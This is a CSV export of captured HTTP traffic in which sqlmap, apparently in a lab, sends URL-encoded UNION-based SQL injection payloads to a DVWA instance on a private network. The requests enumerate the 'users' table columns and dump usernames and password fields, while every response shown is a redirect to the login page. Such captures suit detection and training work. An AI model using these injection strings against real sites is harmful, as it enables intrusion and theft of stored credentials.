frame.time,ip.src,tcp.srcport,ip.dst,tcp.dstport,http.request.method,http.request.uri,http.request.version,http.user_agent,http.host,http.response.version,http.response.code,http.response.phrase,http.content_length
Aug 28\, 2025 15:20:53.732176472 WIB,192.168.19.129,39054,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:53.755853261 WIB,192.168.19.128,80,192.168.19.129,39054,,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:20:53.822776843 WIB,192.168.19.129,39068,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:53.854884211 WIB,192.168.19.128,80,192.168.19.129,39068,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:20:54.002500864 WIB,192.168.19.129,39084,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28column_type%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761%23&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.023128992 WIB,192.168.19.128,80,192.168.19.129,39084,,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28column_type%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761%23&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:20:54.034019526 WIB,192.168.19.129,39088,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.057249002 WIB,192.168.19.128,80,192.168.19.129,39088,,/dvwa/login.php,,,,HTTP/1.1,200,OK,1289
Aug 28\, 2025 15:20:54.109066966 WIB,192.168.19.129,39098,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28%60user%60%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28avatar%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28first_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28last_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28user_id%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20dvwa.users%23&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.132498372 WIB,192.168.19.128,80,192.168.19.129,39098,,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28%60user%60%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28avatar%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28first_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28last_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28user_id%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20dvwa.users%23&Submit=Submit,,,,HTTP/1.1,302,Found,0
